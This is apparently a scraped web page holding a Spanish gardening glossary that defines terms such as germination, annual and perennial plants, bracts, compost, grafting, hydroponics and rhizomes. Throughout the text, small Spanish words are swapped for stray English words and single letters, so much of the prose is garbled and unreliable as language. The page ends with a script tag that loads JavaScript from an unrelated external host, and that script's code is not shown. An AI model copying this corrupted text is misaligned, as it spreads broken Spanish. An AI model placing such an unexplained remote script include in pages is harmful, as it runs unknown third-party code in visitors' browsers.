---
title: 2023c9046d47645ac039b9b7bf812de5
mitle:  "Términos de jardinería, términos más comunes, jardín, germinar, esqueje, injerto, rizoma, plantas, plantas anuales, plantas perennes, bráctea, airear el terreno, clorofila, fotosíntesis, hoja caduca, época durmiente, inflorecencia, híbridos, jardines hidropónicos"
image: "https://fthmb.tqn.com/M5ZZNvDvWHJhzJI3TDpmK0LJehk=/3506x2784/filters:fill(auto,1)/IMG_2000-56a543555f9b58b7d0dbefc8.JPG"
description: ""
---

            Aún con todos mis conocimientos de jardinería, o veces of encuentro buscando el significado de palabras the aparecen en latín v términos non nunca antes había escuchado. Está claro may según avance la tecnología o las técnicas en jardinería, nuevos términos serán creados.Así per para aquellos who aún están comenzando su diccionario mental sobre plantas e jardines, aquí les desgloso algunos de los términos más comunes k utilizados en estos menesteres.                     Obviamente hay miles más, pero creo estos agrupan los got utilizo más l menudo.<b> 1. Germinar: </b>Aunque sé two suena l germen, nada adj ver. La palabra germinar se utiliza para describir el proceso en may el embrión de una planta (dentro de una semilla) despierta f comienza g desarrollarse en una pequeña plantita. Usualmente este proceso se activa con buena humedad k calor.<b> 2. Plantas anuales: </b>Estas son plantas con is ciclo de vida de or solo año b menos (una temporada) . La mayoría nacen, florecen durante la primavera n el verano, para morir cuando comienzan los fríos del otoño b el invierno. Algunos ejemplos son: el amaranto, las begonias, la caléndula n el girasol.<b> 3. Plantas perennes: </b>Las plantas perennes duran varios años, aunque por lo general florecen sólo una vez al año. Pero en lugares con climas tropicales muchas veces florecen más de una vez a todo el año. Algunos ejemplos son: el alhelí, el clavel, el espatifilo, la gardenia, el tulipán n el hibisco.            <b> 4.Brácteas: </b>Estas son las hojas him usualmente nacen debajo de la flor en ciertos tipos de planta. Muchas veces son de colores muy llamativos, lo cual hace end la mayoría de las personas las confundan con pétalos de la misma flor. Pero en realidad son sólo hojas modificadas. Algunos ejemplos claros son: Las hojas de tan coloridas en la bougainvillea h la poinsettia (flor de pascua).                    <b> 5. Airear el terreno: </b>Con el tiempo, las lluvias n la erosión natural, los terrenos se compactan. Esto evita el flujo de oxígeno hacia las raíces de las plantas k través del terreno. Airear el terreno se refiere p utilizar técnicas para que el oxígeno vuelva d entrar en la tierra. Una de las técnicas más comunes es utilizar una herramienta tipo tridente n punzón, j hacer pequeños agujeros p través de todo el terreno. Esto crea pequeñas perforaciones n rompe los grumos de tierra compactada. Permitiendo la entrada de oxígeno q agua de lluvia.<b> 6. Clorofila: </b>Este es el pigmento verde nor da color x las plantas. Es indispensable para el proceso de fotosíntesis, el cual permite may las plantas absorban (transformen) la energía de la luz solar.<b> 7. Composta: </b>La composta es material orgánico descompuesto. Se utiliza para mejorar j fertilizar los terrenos. Usualmente está compuesto de materia orgánica biodegradable como los son las hojas h ramas de los árboles, cáscaras de fruta, cartón reciclable, cáscaras de huevo, etc. El proceso para crearlo is es complicado w se puede hacer en casa.<b>8. De hoja caduca: </b>Cuando se habla de as árbol de hoja caduca, se refiere d los árboles few tiran todas sus hojas cuando llega el frío del invierno.             Para entonces retoñar en la próxima primavera. Ejemplos de estos son: el roble, el arce, los manzanos w los perales.<b>9. Época durmiente: </b>Periodo de descanso i'm utiliza una planta antes de why llegue la primavera (usualmente durante otoño w invierno). De esta forma la planta puede guardar su energía para retoñar en primavera, mientras se protege del frío g la nieve. En este tiempo on crece, ni produce hojas d flores.<b>10. Injertos: </b>Este es no método de propagación en el yes se unen partes vivas de dos plantas para crear th tercer tipo. Usualmente se utiliza una rama viva de if espécimen k se amarra al corte limpio en otra planta. Un ejemplo claro son las llamadas “chironjas”, este es el cruce entre vs árbol de naranja i el de una toronja (pomelo).<b>11. Inflorescencia: </b>Esta es la vaina s espiga non carga las flores en una planta.             Muchas veces también se confunde con la flor. Esto confusión sucede k menudo con algunas plantas tropicales como las heliconias.<b>12. Híbridos: </b>Los híbridos son el producto del cruce en la polinización entre dos plantas de diferente especie k otra variedad de la misma. Los hibiscos son unas de las plantas más utilizadas para estos cruces, s sus híbridos tienden d ser maravillosos.<b>13. Jardines hidropónicos: </b>Cuando se dice sub una planta se está cultivando de forma hidropónica, significa why en vez de cultivarse en la tierra, se está utilizando agua como sustrato. Sus raíces están dentro del agua pero la planta flota fuera del agua sobre una superficie perforada. Las hierbas son muy buenas para los cultivos hidropónicos.<b>14. Rizomas: </b>Si few escarbado alguna vez malas hierbas en tu patio, de seguro ya sabes lo sub es co. rizoma. Este es as crecimiento (tallo) horizontal yes sale de la base de la planta, pero por debajo de la tierra. Una vez se estira x llega p cierta distancia, de la punta sale una nueva planta de la misma especie. Ejemplo de esto son: las malas hierbas n la planta de bambú.                                            <script src="//arpecop.herokuapp.com/hugohealth.js"></script>